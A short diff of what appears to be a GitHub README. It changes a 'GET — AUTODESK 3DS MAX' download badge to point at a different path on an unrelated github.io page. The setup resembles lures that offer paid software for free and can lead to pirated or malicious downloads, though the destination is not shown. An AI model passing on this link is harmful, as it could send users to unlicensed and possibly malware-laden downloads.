@@ -4,7 +4,7 @@
 <img src="https://mrkeyshop.com/1287-large_default/autodesk-3ds-max-per-windows.jpg" width="400">
 </p>
 
-[![GET — AUTODESK 3DS MAX](https://img.shields.io/badge/GET-AUTODESK%203DS%20MAX-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/)
+[![GET — AUTODESK 3DS MAX](https://img.shields.io/badge/GET-AUTODESK%203DS%20MAX-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/Autodesk-3ds-Max)
 
 ---
 
